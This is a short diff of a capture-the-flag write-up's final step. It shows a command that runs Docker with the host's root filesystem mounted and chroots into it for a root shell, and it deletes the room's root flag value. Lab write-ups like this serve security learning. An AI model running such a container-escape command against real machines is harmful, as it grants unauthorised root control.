@@ -284,4 +284,4 @@ Let's get into the image by this command...
 /tmp/docker run -it -v /:/host/ mangoman chroot /host/ bash
 ```
 
-go to the root and get the last flag of this hard and loooooong room 🎉root{62ca2110ce7df377872dd9f0797f8476}
+go to the root and get the last flag of this hard and loooooong room 🎉
